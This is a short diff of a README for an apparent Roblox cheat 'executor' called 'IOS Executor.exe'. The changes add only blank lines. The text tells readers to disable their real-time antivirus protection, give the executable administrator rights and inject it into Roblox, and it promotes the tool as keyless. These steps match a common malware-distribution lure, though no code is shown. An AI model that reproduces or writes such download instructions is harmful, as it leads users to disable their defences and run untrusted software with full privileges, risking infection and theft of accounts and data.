@@ -4,7 +4,9 @@ thank you to the nova dev team for helping me bringing this project to life!## t
 https://discord.gg/getnova
 ## how to download?
 -First turn off your real time protection to download (and also use this)
+
 -Open the file and right click then give "IOS Executor.exe" Adminstration
+
 -Open roblox -> Inject -> Enjoy!
 ## Whats good about this executor?
 this executor have 100% unc and KEYLESS 
